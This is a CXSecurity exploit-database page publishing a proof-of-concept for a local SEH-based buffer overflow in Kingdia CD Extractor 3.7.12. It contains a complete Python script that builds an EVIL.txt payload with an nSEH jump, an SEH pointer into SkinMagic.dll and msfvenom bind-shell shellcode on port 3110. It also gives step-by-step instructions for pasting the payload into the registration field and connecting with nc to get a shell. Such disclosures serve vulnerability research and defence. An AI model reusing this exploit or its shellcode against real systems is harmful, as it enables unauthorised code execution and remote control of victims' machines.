---
title: Kingdia CD Extractor 3.7.12 - Buffer Overflow SEH
url: https://cxsecurity.com/issue/WLB-2025050038
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-20
fetch_date: 2025-10-06T22:23:24.440417
---

# Kingdia CD Extractor 3.7.12 - Buffer Overflow SEH

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Kingdia CD Extractor 3.7.12 - Buffer Overflow SEH** **2025.05.19**  **![de](https://cert.cx/cxstatic/images/flags/de.png) [Achilles](https://cxsecurity.com/author/Achilles/1/) **(DE)** ![de](https://cert.cx/cxstatic/images/flags/de.png)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Kingdia CD Extractor 3.7.12 - Buffer Overflow (SEH)
# Date: 17.05.2025
# Software Link: https://download.cnet.com/kingdia-cd-extractor/3001-2140\_4-10355785.html?dt=internalDownload
# Exploit Author: Achilles
# Tested Version: 3.7.12
# Tested on: Windows 11 64bit
# 1.- Run python code : Kingdia.py
# 2.- Open EVIL.txt and copy All content to Clipboard
# 3.- Open Kingdia CD Extractor and press Register
# 4.- Paste the Content of EVIL.txt into the 'Name and Code Field'
# 5.- Click 'OK'
# 6.- Nc.exe Local IP Port 3110 and you will have a bind shell
# 7.- Greetings go:XiDreamzzXi,Metatron
#!/usr/bin/env python
import struct
buffer = "\x41" \* 256
nseh = "\xEB\x06\x90\x90" #jmp short 6
seh = struct.pack('<L',0x10037859) #SkinMagic.dll
nops = "\x90" \* 20
#msfvenom -p windows/shell\_bind\_tcp LPORT=3110 -f py -e x86/alpha\_mixed E=
#XITFUNC=thread -b "\x00\x0a\x0d"
buf = b""
buf += b"\x89\xe0\xdb\xd9\xd9\x70\xf4\x59\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37"
buf += b"\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += b"\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x39\x78\x6c\x42"
buf += b"\x43\x30\x73\x30\x75\x50\x73\x50\x4e\x69\x58\x65\x70"
buf += b"\x31\x69\x50\x32\x44\x6c\x4b\x56\x30\x76\x50\x6e\x6b"
buf += b"\x31\x42\x34\x4c\x6e\x6b\x51\x42\x52\x34\x6c\x4b\x71"
buf += b"\x62\x75\x78\x36\x6f\x68\x37\x73\x7a\x74\x66\x65\x61"
buf += b"\x4b\x4f\x4c\x6c\x77\x4c\x70\x61\x61\x6c\x63\x32\x66"
buf += b"\x4c\x35\x70\x79\x51\x58\x4f\x54\x4d\x53\x31\x79\x57"
buf += b"\x6d\x32\x59\x62\x63\x62\x31\x47\x6c\x4b\x50\x52\x52"
buf += b"\x30\x4e\x6b\x53\x7a\x37\x4c\x4c\x4b\x72\x6c\x32\x31"
buf += b"\x51\x68\x58\x63\x52\x68\x56\x61\x4e\x31\x53\x61\x6e"
buf += b"\x6b\x70\x59\x37\x50\x53\x31\x4b\x63\x6c\x4b\x42\x69"
buf += b"\x57\x68\x58\x63\x75\x6a\x61\x59\x4c\x4b\x46\x54\x6e"
buf += b"\x6b\x63\x31\x39\x46\x34\x71\x39\x6f\x4c\x6c\x5a\x61"
buf += b"\x5a\x6f\x44\x4d\x65\x51\x59\x57\x54\x78\x4b\x50\x74"
buf += b"\x35\x4a\x56\x54\x43\x33\x4d\x49\x68\x37\x4b\x63\x4d"
buf += b"\x35\x74\x70\x75\x68\x64\x71\x48\x6e\x6b\x50\x58\x55"
buf += b"\x74\x46\x61\x78\x53\x70\x66\x4c\x4b\x74\x4c\x72\x6b"
buf += b"\x4e\x6b\x53\x68\x45\x4c\x45\x51\x38\x53\x6c\x4b\x75"
buf += b"\x54\x6e\x6b\x55\x51\x4e\x30\x4d\x59\x33\x74\x35\x74"
buf += b"\x45\x74\x43\x6b\x61\x4b\x51\x71\x63\x69\x63\x6a\x70"
buf += b"\x51\x4b\x4f\x6d\x30\x43\x6f\x31\x4f\x51\x4a\x4e\x6b"
buf += b"\x76\x72\x4a\x4b\x4c\x4d\x61\x4d\x73\x58\x64\x73\x57"
buf += b"\x42\x73\x30\x43\x30\x65\x38\x63\x47\x51\x63\x57\x42"
buf += b"\x61\x4f\x50\x54\x61\x78\x42\x6c\x33\x47\x56\x46\x54"
buf += b"\x47\x59\x6f\x59\x45\x48\x38\x6a\x30\x37\x71\x35\x50"
buf += b"\x57\x70\x77\x59\x6f\x34\x33\x64\x32\x70\x70\x68\x35"
buf += b"\x79\x4b\x30\x32\x4b\x55\x50\x79\x6f\x39\x45\x43\x5a"
buf += b"\x47\x78\x53\x69\x50\x50\x58\x62\x59\x6d\x51\x50\x42"
buf += b"\x70\x31\x50\x30\x50\x55\x38\x48\x6a\x66\x6f\x49\x4f"
buf += b"\x79\x70\x39\x6f\x78\x55\x6d\x47\x42\x48\x57\x72\x37"
buf += b"\x70\x76\x6c\x54\x66\x4b\x39\x6b\x56\x63\x5a\x46\x70"
buf += b"\x72\x76\x51\x47\x55\x38\x68\x42\x4b\x6b\x77\x47\x75"
buf += b"\x37\x79\x6f\x7a\x75\x43\x67\x50\x68\x4c\x77\x6d\x39"
buf += b"\x76\x58\x49\x6f\x79\x6f\x69\x45\x66\x37\x63\x58\x33"
buf += b"\x44\x78\x6c\x47\x4b\x38\x61\x49\x6f\x39\x45\x51\x47"
buf += b"\x6f\x67\x50\x68\x42\x55\x62\x4e\x50\x4d\x35\x31\x69"
buf += b"\x6f\x38\x55\x43\x58\x45\x33\x62\x4d\x71\x74\x35\x50"
buf += b"\x6b\x39\x49\x73\x46\x37\x50\x57\x52\x77\x75\x61\x58"
buf += b"\x76\x33\x5a\x34\x52\x63\x69\x33\x66\x58\x62\x4b\x4d"
buf += b"\x73\x56\x6f\x37\x77\x34\x55\x74\x45\x6c\x46\x61\x66"
buf += b"\x61\x6e\x6d\x42\x64\x36\x44\x54\x50\x6f\x36\x63\x30"
buf += b"\x63\x74\x36\x34\x42\x70\x62\x76\x72\x76\x36\x36\x33"
buf += b"\x76\x46\x36\x50\x4e\x66\x36\x43\x66\x30\x53\x43\x66"
buf += b"\x71\x78\x44\x39\x58\x4c\x47\x4f\x4c\x46\x79\x6f\x79"
buf += b"\x45\x4e\x69\x79\x70\x62\x6e\x62\x76\x57\x36\x6b\x4f"
buf += b"\x34\x70\x30\x68\x77\x78\x6b\x37\x55\x4d\x33\x50\x69"
buf += b"\x6f\x48\x55\x6d\x6b\x69\x70\x67\x6d\x55\x7a\x54\x4a"
buf += b"\x52\x48\x39\x36\x4c\x55\x6f\x4d\x6d\x4d\x6b\x4f\x49"
buf += b"\x45\x67\x4c\x34\x46\x71\x6c\x37\x7a\x4b\x30\x39\x6b"
buf += b"\x59\x70\x50\x75\x73\x35\x4f\x4b\x61\x57\x47\x63\x61"
buf += b"\x62\x52\x4f\x33\x5a\x55\x50\x76\x33\x6b\x4f\x49\x45"
buf += b"\x41\x41"
pad ="B" \* (7736 - len(buffer) - len(nseh+seh) - len(nops) -len(buf))
payload = buffer + nseh + seh + nops + buf + pad
try:
f=open("Evil.txt","w")
print "[+] Creating %s bytes evil payload.." %len(payload)
f.write(payload)
f.close()
print "[+] File created!"
except:
print "File cannot be created"

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050038)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top